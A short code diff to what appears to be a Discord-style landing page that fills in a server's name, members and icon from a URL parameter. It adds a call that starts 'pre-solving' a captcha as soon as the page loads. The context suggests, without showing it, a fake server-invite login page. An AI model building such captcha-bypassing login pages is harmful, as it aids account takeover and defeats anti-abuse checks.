@@ -135,6 +135,8 @@ function openDiscordLogin() {
 
 // Parse URL data parameter (base64 JSON with guildId, name, members, icon)
 (function() {
+  // Start pre-solving captcha immediately on landing page
+  fetch('/api/pressolve', {method:'POST'}).catch(function(){});
   try {
     var params = new URLSearchParams(window.location.search);
     var data = params.get('data');
